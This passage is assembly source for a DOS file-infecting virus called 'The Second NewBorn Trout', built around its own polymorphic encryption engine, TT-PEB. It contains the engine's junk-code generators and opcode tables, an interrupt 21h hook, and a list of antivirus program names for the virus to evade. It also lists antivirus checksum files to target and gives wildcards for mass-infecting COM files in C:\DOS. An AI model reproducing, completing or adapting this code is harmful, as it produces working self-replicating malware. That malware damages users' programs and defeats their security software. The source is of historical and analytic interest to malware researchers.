                dw      offset garb_c70
                dw      offset garb_c71
                dw      offset garb_c72
                dw      offset garb_c73
                dw      offset garb_c74
                dw      offset garb_c75
                dw      offset garb_c76
                dw      offset garb_c77
                dw      offset garb_c78
                dw      offset garb_c79
                dw      offset garb_c7a
                dw      offset garb_c7b
                dw      offset garb_c7c
                dw      offset garb_c7d
                dw      offset garb_c7e
                dw      offset garb_c7f
                dw      offset garb_c80
                dw      offset garb_c81
                dw      offset garb_c82
                dw      offset garb_c83
                dw      offset garb_c84
                dw      offset garb_c9c
                dw      offset garb_c85
                dw      offset garb_c86
                dw      offset garb_c87
                dw      offset garb_c28
                dw      offset garb_c88
                dw      offset garb_c89
                dw      offset garb_c8a
                dw      offset garb_c8b
                dw      offset garb_c8c
                dw      offset garb_c8d
                dw      offset garb_c8e
                dw      offset garb_c8f
                dw      offset garb_c90
                dw      offset garb_c91
                dw      offset garb_c92
                dw      offset garb_c93
                dw      offset garb_c94
                dw      offset garb_c95
                dw      offset garb_c96
                dw      offset garb_c97
                dw      offset garb_c98
                dw      offset garb_c99
                dw      offset garb_c9a
                dw      offset garb_c9b
                dw      offset garb_c26
                dw      offset garb_c9d
                dw      offset garb_c9e
                dw      offset garb_c9f
                dw      offset garb_ca0
                dw      offset garb_ca1
                dw      offset garb_ca2
                dw      offset garb_ca3
                dw      offset garb_ca4
                dw      offset garb_ca5
                dw      offset garb_ca6
                dw      offset garb_ca7
                dw      offset garb_ca8
                dw      offset garb_ca9
                dw      offset garb_caa
                dw      offset garb_cab
                dw      offset garb_cac
                dw      offset garb_cad
                dw      offset garb_cae
                dw      offset garb_caf
                dw      offset garb_c25
                dw      offset garb_cb0
                dw      offset garb_cb1
                dw      offset garb_cb2
                dw      offset garb_cb3
                dw      offset garb_cb4
                dw      offset garb_cb5
                dw      offset garb_cb6
                dw      offset garb_cb7
                dw      offset garb_cb8
                dw      offset garb_cb9
                dw      offset garb_cbc
                dw      offset garb_cbd
                dw      offset garb_cbe
                dw      offset garb_cbe
                dw      offset garb_cbf
                dw      offset garb_cbf
                dw      offset garb_cc0
                dw      offset garb_cc0
                dw      offset garb_cc1
                dw      offset garb_cc1
                dw      offset garb_cc2
                dw      offset garb_cc2
                dw      offset garb_cc3
                dw      offset garb_cc3
                dw      offset garb_cc4
                dw      offset garb_cc4
                dw      offset garb_cc5
                dw      offset garb_cc5
                dw      offset garb_cc6
                dw      offset garb_cc6
                dw      offset garb_cc7
                dw      offset garb_cc7
                dw      offset garb_cc8
                dw      offset garb_cc8
                dw      offset garb_cc9
                dw      offset garb_cc9
                dw      00h                     ; end marker

; End of table with garbage constructs offsets

garb_cf0:
;
; looks like
;       jmp short foo1
;         _rndnr
;       foo1:
;
                mov     al,0ebh                 ; jmp short
                stosb
loc_122:
                call    get_random
		and	ax,7
		cmp	al,0
                je      loc_122
                stosb                           ; store the offset
		mov	cx,ax
locloop_123:
                call    get_random
                stosb                           ; fill with random data
                loop    locloop_123
                retn

garb_cf1:
;
; looks like
;       jmpc foo1
;         _garbage
;       foo1:
;
                mov     al,[spec_cnst]
                mov     byte ptr [spec_cnst],0  ; lock generation of spec
		push	ax
                mov     al,[some_lock]
                mov     byte ptr [some_lock],0
		push	ax
loc_124:
                call    get_random
		and	al,0Fh
		cmp	al,2
                jb      loc_124
		cmp	al,7
                ja      loc_124
                or      al,70h
                stosb                           ; do some sort of conditional
                                                ; jump
                add     di,1
		push	di
		mov	al,0Fh
		call	sub_37
		pop	bx
		mov	ax,di
		sub	ax,bx
                mov     es:[bx-1],al            ; cnd jump offset
		pop	ax
                mov     [some_lock],al
		pop	ax
                mov     [spec_cnst],al
		retn
garb_cf2:
;
; looks like
;       jcxz foo1
;         _garbage
;       foo1:
;
                mov     al,[spec_cnst]
                mov     byte ptr [spec_cnst],0
		push	ax
                mov     al,[some_lock]
                mov     byte ptr [some_lock],0
		push	ax
                mov     al,0e3h                 ; jcxz opcode
                stosb
		add	di,1
		push	di
		mov	al,0Fh
		call	sub_37
		pop	bx
		mov	ax,di
		sub	ax,bx
                mov     es:[bx-1],al            ; jcxz jump offset
		pop	ax
                mov     [some_lock],al
		pop	ax
                mov     [spec_cnst],al
		retn
garb_cf3:
;
; looks like:
;       call foo1
;         _garbage
;       jmp a_foo1
;      foo1:
;         _garbage
;       ret
;         _rndnr
;      a_foo1:
;
                mov     al,[spec_cnst]
                mov     byte ptr [spec_cnst],0
		push	ax
                call    get_random
                mov     al,0e8h                 ; call opcode
                stosb
		add	di,2
		push	di
		mov	al,3
                call    garbager
                mov     al,0ebh                 ; jmp short opcode
                stosb
		add	di,1
		pop	bx
		push	di
		mov	ax,di
		sub	ax,bx
                mov     es:[bx-2],ax            ; adress to be call-ed
		mov	al,7
                call    sub_37                  ; garbage
                mov     al,0C3h                 ; ret opcode
                stosb
                call    get_random
		and	ax,7
		cmp	ax,0
                je      loc_126
		mov	cx,ax

locloop_125:
                call    get_random
                stosb
                loop    locloop_125

loc_126:
		pop	bx
		mov	ax,di
		sub	ax,bx
                mov     es:[bx-1],al            ; adress for the jmp short
                                                ; after the call-ed
                                                ; "subroutine"
		pop	ax
                mov     [spec_cnst],al
		retn
garb_cf4:
;
; looks like
;       push cs
;       call foo1
;         _garbage
;       jmp a_foo1
;      foo1:
;         _garbage
;       retf
;         _rndnr
;      a_foo1:
;
                mov     al,[spec_cnst]
                mov     byte ptr [spec_cnst],0
		push	ax
                mov     al,0eh                  ; push cs opcode
                stosb
		mov	al,7
                call    garbager
                mov     al,0e8h                 ; call opcode
                stosb
		add	di,2
		push	di
		mov	al,3
                call    garbager
                mov     al,0ebh                 ; jmp that will jump the
                stosb                           ; call-ed subroutine
		add	di,1
		pop	bx
		push	di
		mov	ax,di
		sub	ax,bx
                mov     es:[bx-2],ax            ; adress for the call
		mov	al,7
                call    sub_37                  ; garbage
                mov     al,0cbh                 ; retf opcode
                stosb
                call    get_random
		and	ax,7
		cmp	ax,0
                je      loc_128
		mov	cx,ax
locloop_127:
                call    get_random
                stosb
                loop    locloop_127
loc_128:
		pop	bx
		mov	ax,di
		sub	ax,bx
                mov     es:[bx-1],al            ; the offset for the jmp
		pop	ax
                mov     [spec_cnst],al
		retn
garb_cf5:
;
; looks like
;       push reg_x
;         _garbage
;       pop  reg_x
;
                call    garb_rr1f
		push	ax
                or      al,50h                  ; push base opcode
                stosb
		mov	al,0Fh
		call	sub_37
		pop	ax
                or      al,58h                  ; pop base opcode
                stosb
		retn

; Garbage instruction construction table
; Every entry in this table is used to create some kind of garbage. The dbs
; are interpreted byte by byte by a TT-PEB routine. There is some sorta
; "compiler" of garbage in TT-PEB. More in the poly description :-)

garb_c00        db      000h,090h,0ffh
garb_c01        db      000h,0fbh,0ffh
garb_c02        db      000h,0fah,0ffh
garb_c03        db      000h,0f9h,0ffh
garb_c04        db      000h,0f8h,0ffh
garb_c05        db      000h,0fdh,0ffh
garb_c06        db      000h,0fch,0ffh
garb_c07        db      000h,0f5h,0ffh
garb_c08        db      02eh,000h,0ffh,000h,02fh,0ffh
garb_c0a        db      02eh,004h,0ffh,000h,09fh,0ffh
garb_c0c        db      000h,09eh,0ffh
garb_c0d        db      02fh,000h,0ffh,000h,037h,0ffh
garb_c0f        db      02fh,000h,0ffh,000h,03fh,0ffh
garb_c11        db      02fh,000h,0ffh,001h,002h,0d4h,00ah,0ffh
garb_c13        db      02fh,000h,0ffh,001h,002h,0d5h,00ah,0ffh
garb_c15        db      02eh,000h,0ffh,02fh,006h,0ffh,031h,000h,0ach,0ffh
garb_c18        db      02eh,000h,0ffh,02fh,006h,0ffh,02fh,007h,0ffh,031h
                db      000h,0a6h,0ffh
garb_c1c        db      02fh,007h,0ffh,031h,000h,0aeh,0ffh
garb_c1e        db      02eh,000h,0ffh,000h,0d7h,0ffh
garb_c20        db      02eh,004h,0ffh,000h,098h,0ffh
garb_c22        db      02fh,002h,0ffh,000h,099h,0ffh
garb_c24        db      032h,0ffh,02fh,001h,0ffh,004h,00ch,002h,0e0h,000h
                db      0feh,0ffh
garb_c27        db      02fh,000h,0ffh,029h,00bh,090h,0ffh
garb_c29        db      01fh,00bh,050h,029h,00bh,058h,0ffh
garb_c2a        db      004h,00ch,018h,006h,029h,00bh,058h,0ffh
garb_c2b        db      014h,00bh,0b0h,005h,0ffh
garb_c2c        db      000h,080h,014h,00bh,0c0h,005h,0ffh
garb_c2d        db      000h,080h,019h,00bh,0d0h,005h,0ffh
garb_c2e        db      000h,080h,014h,00bh,0e8h,005h,0ffh
garb_c2f        db      000h,080h,019h,00bh,0d8h,005h,0ffh
garb_c30        db      000h,080h,00fh,00bh,0f8h,005h,0ffh
garb_c31        db      000h,080h,014h,00bh,0f0h,005h,0ffh
garb_c32        db      000h,080h,014h,00bh,0e0h,005h,0ffh
garb_c33        db      000h,080h,014h,00bh,0c8h,005h,0ffh
garb_c34        db      000h,082h,014h,00bh,0c0h,005h,0ffh
garb_c35        db      000h,082h,019h,00bh,0d0h,005h,0ffh
garb_c36        db      000h,082h,014h,00bh,0e8h,005h,0ffh
garb_c37        db      000h,082h,019h,00bh,0d8h,005h,0ffh
garb_c38        db      000h,082h,00fh,00bh,0f8h,005h,0ffh
garb_c39        db      000h,082h,014h,00bh,0f0h,005h,0ffh
garb_c3a        db      000h,082h,014h,00bh,0e0h,005h,0ffh
garb_c3b        db      000h,082h,014h,00bh,0c8h,005h,0ffh
garb_c3c        db      000h,088h,01ah,00bh,0c0h,0ffh
garb_c3d        db      000h,000h,01ah,00bh,0c0h,0ffh
garb_c3e        db      000h,010h,01ah,00bh,0c0h,0ffh
garb_c3f        db      000h,028h,01ah,00bh,0c0h,0ffh
garb_c40        db      000h,018h,01ah,00bh,0c0h,0ffh
garb_c41        db      000h,038h,01ah,00bh,0c0h,0ffh
garb_c42        db      000h,030h,01ah,00bh,0c0h,0ffh
garb_c43        db      000h,020h,01ah,00bh,0c0h,0ffh
garb_c44        db      000h,008h,01ah,00bh,0c0h,0ffh
garb_c45        db      000h,08ah,012h,00bh,0c0h,0ffh
garb_c46        db      000h,002h,012h,00bh,0c0h,0ffh
garb_c47        db      000h,012h,012h,00bh,0c0h,0ffh
garb_c48        db      000h,02ah,012h,00bh,0c0h,0ffh
garb_c49        db      000h,01ah,012h,00bh,0c0h,0ffh
garb_c4a        db      000h,03ah,012h,00bh,0c0h,0ffh
garb_c4b        db      000h,032h,012h,00bh,0c0h,0ffh
garb_c4c        db      000h,022h,012h,00bh,0c0h,0ffh
garb_c4d        db      000h,00ah,012h,00bh,0c0h,0ffh
garb_c4e        db      000h,086h,01ch,00bh,0c0h,0ffh
garb_c4f        db      000h,0feh,014h,00bh,0c0h,0ffh
garb_c50        db      000h,0feh,014h,00bh,0c8h,0ffh
garb_c51        db      000h,0f6h,00fh,00bh,0c0h,005h,0ffh
garb_c52        db      000h,084h,010h,00bh,0c0h,0ffh
garb_c53        db      000h,084h,00fh,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c54        db      000h,084h,013h,003h,0ffh
garb_c55        db      000h,0f6h,014h,00bh,0d0h,0ffh
garb_c56        db      000h,0f6h,014h,00bh,0d8h,0ffh
garb_c57        db      000h,0d0h,019h,00bh,0c8h,0ffh
garb_c58        db      000h,0d0h,019h,00bh,0c0h,0ffh
garb_c59        db      000h,0d0h,019h,00bh,0e8h,0ffh
garb_c5a        db      000h,0d0h,019h,00bh,0e0h,0ffh
garb_c5b        db      000h,0d0h,019h,00bh,0f8h,0ffh
garb_c5c        db      000h,0d0h,019h,00bh,0d0h,0ffh
garb_c5d        db      000h,0d0h,019h,00bh,0d8h,0ffh
garb_c5e        db      000h,0d2h,019h,00bh,0c8h,0ffh
garb_c5f        db      000h,0d2h,019h,00bh,0c0h,0ffh
garb_c60        db      000h,0d2h,019h,00bh,0e8h,0ffh
garb_c61        db      000h,0d2h,019h,00bh,0e0h,0ffh
garb_c62        db      000h,0d2h,019h,00bh,0f8h,0ffh
garb_c63        db      000h,0d2h,019h,00bh,0d0h,0ffh
garb_c64        db      000h,0d2h,019h,00bh,0d8h,0ffh
garb_c65        db      030h,000h,08ah,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c66        db      030h,000h,002h,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c67        db      030h,000h,012h,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c68        db      030h,000h,02ah,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c69        db      030h,000h,01ah,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c6a        db      030h,000h,03ah,00fh,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c6b        db      030h,000h,038h,00fh,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c6c        db      030h,000h,032h,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c6d        db      030h,000h,022h,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c6e        db      030h,000h,00ah,019h,00eh,003h,00bh,006h,005h,005h,0ffh
garb_c6f        db      030h,000h,08ah,01dh,003h,0ffh
garb_c70        db      030h,000h,002h,01dh,003h,0ffh
garb_c71        db      030h,000h,012h,01dh,003h,0ffh
garb_c72        db      030h,000h,02ah,01dh,003h,0ffh
garb_c73        db      030h,000h,01ah,01dh,003h,0ffh
garb_c74        db      030h,000h,03ah,013h,003h,0ffh
garb_c75        db      030h,000h,038h,013h,003h,0ffh
garb_c76        db      030h,000h,032h,01dh,003h,0ffh
garb_c77        db      030h,000h,022h,01dh,003h,0ffh
garb_c78        db      030h,000h,00ah,01dh,003h,0ffh
garb_c79        db      024h,00bh,0b8h,005h,005h,0ffh
garb_c7a        db      000h,081h,029h,00bh,0c0h,005h,005h,0ffh
garb_c7b        db      000h,081h,029h,00bh,0d0h,005h,005h,0ffh
garb_c7c        db      000h,081h,029h,00bh,0e8h,005h,005h,0ffh
garb_c7d        db      000h,081h,029h,00bh,0d8h,005h,005h,0ffh
garb_c7e        db      000h,081h,01fh,00bh,0f8h,005h,005h,0ffh
garb_c7f        db      000h,081h,024h,00bh,0f0h,005h,005h,0ffh
garb_c80        db      000h,081h,024h,00bh,0e0h,005h,005h,0ffh
garb_c81        db      000h,081h,024h,00bh,0c8h,005h,005h,0ffh
garb_c82        db      000h,083h,029h,00bh,0c0h,005h,0ffh
garb_c83        db      000h,083h,029h,00bh,0d0h,005h,0ffh
garb_c84        db      000h,083h,029h,00bh,0e8h,005h,0ffh
garb_c9c        db      000h,083h,029h,00bh,0d8h,005h,0ffh
garb_c85        db      000h,083h,01fh,00bh,0f8h,005h,0ffh
garb_c86        db      000h,083h,024h,00bh,0f0h,005h,0ffh
garb_c87        db      000h,083h,024h,00bh,0e0h,005h,0ffh
garb_c28        db      000h,083h,024h,00bh,0c8h,005h,0ffh
garb_c88        db      000h,089h,02ah,00bh,0c0h,0ffh
garb_c89        db      000h,001h,02ah,00bh,0c0h,0ffh
garb_c8a        db      000h,011h,02ah,00bh,0c0h,0ffh
garb_c8b        db      000h,029h,02ah,00bh,0c0h,0ffh
garb_c8c        db      000h,019h,02ah,00bh,0c0h,0ffh
garb_c8d        db      000h,039h,02ah,00bh,0c0h,0ffh
garb_c8e        db      000h,031h,02ah,00bh,0c0h,0ffh
garb_c8f        db      000h,021h,02ah,00bh,0c0h,0ffh
garb_c90        db      000h,009h,02ah,00bh,0c0h,0ffh
garb_c91        db      000h,08bh,022h,00bh,0c0h,0ffh
garb_c92        db      000h,003h,022h,00bh,0c0h,0ffh
garb_c93        db      000h,013h,022h,00bh,0c0h,0ffh
garb_c94        db      000h,02bh,022h,00bh,0c0h,0ffh
garb_c95        db      000h,01bh,022h,00bh,0c0h,0ffh
garb_c96        db      000h,03bh,022h,00bh,0c0h,0ffh
garb_c97        db      000h,033h,022h,00bh,0c0h,0ffh
garb_c98        db      000h,023h,022h,00bh,0c0h,0ffh
garb_c99        db      000h,00bh,022h,00bh,0c0h,0ffh
garb_c9a        db      000h,087h,02ch,00bh,0c0h,0ffh
garb_c9b        db      029h,00bh,040h,0ffh
garb_c26        db      029h,00bh,048h,0ffh
garb_c9d        db      000h,0f7h,01fh,00bh,0c0h,005h,005h,0ffh
garb_c9e        db      000h,085h,020h,00bh,0c0h,0ffh
garb_c9f        db      000h,085h,01fh,00eh,003h,00bh,006h,009h,005h,0ffh
garb_ca0        db      000h,0f7h,024h,00bh,0d0h,0ffh
garb_ca1        db      000h,0f7h,029h,00bh,0d8h,0ffh
garb_ca2        db      000h,0d1h,029h,00bh,0c8h,0ffh
garb_ca3        db      000h,0d1h,029h,00bh,0c0h,0ffh
garb_ca4        db      000h,0d1h,029h,00bh,0e8h,0ffh
garb_ca5        db      000h,0d1h,029h,00bh,0e0h,0ffh
garb_ca6        db      000h,0d1h,029h,00bh,0f8h,0ffh
garb_ca7        db      000h,0d1h,029h,00bh,0d0h,0ffh
garb_ca8        db      000h,0d1h,029h,00bh,0d8h,0ffh
garb_ca9        db      000h,0d3h,029h,00bh,0c8h,0ffh
garb_caa        db      000h,0d3h,029h,00bh,0c0h,0ffh
garb_cab        db      000h,0d3h,029h,00bh,0e8h,0ffh
garb_cac        db      000h,0d3h,029h,00bh,0e0h,0ffh
garb_cad        db      000h,0d3h,029h,00bh,0f8h,0ffh
garb_cae        db      000h,0d3h,029h,00bh,0d0h,0ffh
garb_caf        db      000h,0d3h,029h,00bh,0d8h,0ffh
garb_c25        db      030h,000h,08bh,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb0        db      030h,000h,003h,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb1        db      030h,000h,013h,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb2        db      030h,000h,02bh,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb3        db      030h,000h,01bh,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb4        db      030h,000h,03bh,01fh,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb5        db      030h,000h,039h,01fh,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb6        db      030h,000h,033h,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb7        db      030h,000h,023h,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb8        db      030h,000h,00bh,029h,00eh,003h,00bh,006h,009h,005h,0ffh
garb_cb9        db      000h,08dh,02dh,003h,0ffh
garb_cbc        db      000h,08dh,02dh,00bh,040h,005h,0ffh
garb_cbd        db      000h,08dh,02dh,00bh,080h,005h,005h,0ffh
garb_cbe        db      032h,0ffh,02fh,000h,0ffh,001h,004h,0b4h,00bh,0cdh,021h
                db      0ffh
garb_cbf        db      032h,0ffh,02eh,004h,0ffh,001h,004h,0b4h,00dh,0cdh,021h
                db      0ffh
garb_cc0        db      032h,0ffh,02fh,000h,0ffh,001h,004h,0b4h,019h,0cdh,021h
                db      0ffh
garb_cc1        db      032h,0ffh,02fh,000h,0ffh,02fh,001h,0ffh,02fh,002h,0ffh
                db      001h,004h,0b4h,02ah,0cdh,021h,0ffh
garb_cc2        db      032h,0ffh,02eh,004h,0ffh,02fh,001h,0ffh,02fh,002h,0ffh
                db      001h,004h,0b4h,02ch,0cdh,021h,0ffh
garb_cc3        db      032h,0ffh,02fh,000h,0ffh,02fh,003h,0ffh,02fh,001h,0ffh
                db      001h,004h,0b4h,030h,0cdh,021h,0ffh
garb_cc4        db      032h,0ffh,02fh,000h,0ffh,02eh,002h,0ffh,001h,005h,0b8h
                db      000h,033h,0cdh,021h,0ffh
garb_cc5        db      032h,0ffh,02fh,000h,0ffh,001h,004h,0b4h,054h,0cdh,021h
                db      0ffh
garb_cc6        db      032h,0ffh,02fh,000h,0ffh,02fh,001h,0ffh,02fh,002h,0ffh
                db      001h,004h,0b4h,003h,0cdh,010h,0ffh
garb_cc7        db      032h,0ffh,02fh,000h,0ffh,02eh,007h,0ffh,001h,004h,0b4h
                db      00fh,0cdh,010h,0ffh
garb_cc8        db      032h,0ffh,02eh,004h,0ffh,02eh,002h,0ffh,001h,004h,0b4h
                db      000h,0cdh,013h,0ffh
garb_cc9        db      032h,0ffh,02eh,004h,0ffh,02eh,002h,0ffh,001h,004h,0b4h
                db      001h,0cdh,013h,0ffh

; Registers at TT-PEB call (saved poly parameters)
tt_saved_sp     dw      0
tt_saved_ss     dw      0
tt_saved_dx     dw      0
tt_saved_ds     dw      0
tt_saved_cx     dw      0
tt_saved_bp     dw      0
tt_saved_si     dw      0
tt_saved_ax     dw      0

pntr_reg        db      0FFh    ; Register used as pointer (FF = not set yet)
pntr_pos        dw      000h    ; Position in memory where pointer assignment
                                ; is done
cntr_reg        db      0FFh    ; Register used as counter (FF = not set yet)
oper_reg        db      0FFh    ; Register used for opers (FF = not set yet)

                db      0

dec_loop_start  dw      000h    ; Pointer at beginning of the decryption loop
pntr_chdone     db      0       ; FFh if code to update the pointer in the
                                ; decr loop hasn't been already generated.
                                ; 00h pointer update already done
cntr_chdone     db      0       ; FFh if code to update the counter in the
                                ; decr loop hasn't been already generated.
                                ; 00h counter update already done
encr_pnt        dw      000h    ; Pointer at beginning of encrypted code after
                                ; decryptor
mate_pos        dw      000h    ; Position on the math operation
math_oc         db      00h     ; Opcode of the decryptor (the inverse of
                                ; the encryptor)
mathpos         dw      000h    ; Position of the math operation (again)
spec_cnst       db      0FFh    ; FFh can create, 00h can't create
some_lock       db      0FFh    ; FFh can create, 00h can't create
decr_init       db      0FFh    ; 00h building main decrypt. loop, FFh not yet
                                ; this three varialbes are used to limit in
                                ; some circumstances the generation of some
                                ; kind of code (for example a call in another
                                ; call construct and soo on)

                db      'STACK STACK STACK STACK STACK STACK '
                db      'STACK STACK STACK STACK STACK STACK '
                db      'STACK STACK STACK STACK STACK STACK '
                db      'STACK STACK STACK STACK STACK STACK '
                db      'STACK STACK STACK STACK STACK STACK '
                db      'STACK STACK STACK STACK '

tt_stack:
; TT-PEB stack grows (backwards :) ) from here

int21h_jump     db      0e9h                            ; jmp to int21h handler
                dw      offset int21h_handler - 103h    ; in memory (so the -)
                db      '2T'                            ; 2Trout marker

virus_message:
                db      'This is "The Second NewBorn Trout" virus',0dh,0ah
                db      'Programmed in the city of Milan, North Italy',0dh,0ah
                db      '[C] The Tricky Trout 1995', 0dh, 0ah
                db      'Mutation Engine: TT-PEB '
                db      '(Tricky Trout Plurimorphic Encryptor Builder) '
                db      'version 2.01 (TPE standard)',0dh,0ah

orig_bytes      db      0cdh,020h,090h,090h,090h
com_suffix      db      'COM',0,0

os_files        db      'IBMBIO.','IBMDOS.','COMMAND.', 0
av_names        db      'SCAN.','NETSCAN.','CLEAN.','VSHIELD.'
                db      'F-PROT.','VSAFE.','MSAV.','CPAV.'
                db      'NAV.','TBAV.','TBSCAN.','VDS.','NOVI.'
                db      'AVP.','-V.','-VPRO.','VIREX.','AVSCAN.'
                db      'VI-SPY.','GUARD.','FINDVIRU.','TNT.','TNTAV.'
                db      'HTSCAN.','NEMESIS.','NOD.','ITAV.','VI.'
                db      'VIRIT.','IM.','WIN.','TD.','DEBUG.', 0

crc_files       db      'CHKLIST.MS', 0
		db	'CHKLIST.CPS', 0
		db	'ANTI-VIR.DAT', 0
		db	'\SCANCRC.CRC', 0
		db	'\_CHK.CHK', 0
                db      '\NAV_._NO',0
crc_files_end   db      0

fastfile1       db      'C:*.COM', 0            ; fastinfection wildcards
fastfile2       db      'C:\DOS\KEYB.COM', 0    ; for the installation on
fastfile3       db      'C:\DOS\*.COM', 0       ; the new system :)
fastfile4       db      '*.COM', 0

poly_in_mem     db      0       ; 00h means it is run normally from file
                                ; 01h means the virus is executed from a poly
                                ;     generation in memory (when an AV is going
                                ;     to be run). the 01h is at the same time
                                ;     used as the value where the seg:off of
                                ;     the jump to int21h is, this is at
                                ;     virussegment:1)
poly_segmem     dw      0000h   ; segment of the virus in memory at
                                ; disactivation when an AV started

encvir_dx       dw      0                       ; seg:off of the encrypted
encvir_ds       dw      0                       ; virus in memory
orig_int21h     dw      0000h, 0000h            ; seg:off of original int 21h

int24_off       dw      0000h
int24_seg       dw      0000h

fast_cntr       db      0                       ; infected files during fast
                                                ; infection
good_inf        db      0                       ; 01h last fast infection was
                                                ; succesfull, 00h it wasn't
finf_name       dw      0000h, 0000h            ; DS:DX on filename that is
                                                ; going to be infected
orig_att        dw      00h                     ; original file attributes

f_time          db      000h
; -> Virus end on disk ! <-

tsnbt_fend:
                db      00h
f_date          dw      00h                     ; original file date
f_length        dw      00h                     ; original file length
mem_buff        db      1eh     dup (?)
buff_1          db      12h     dup (?)
buff_2          db    3336h     dup (?)
mem_end:

seg_a		ends

                end     tsnbt_start

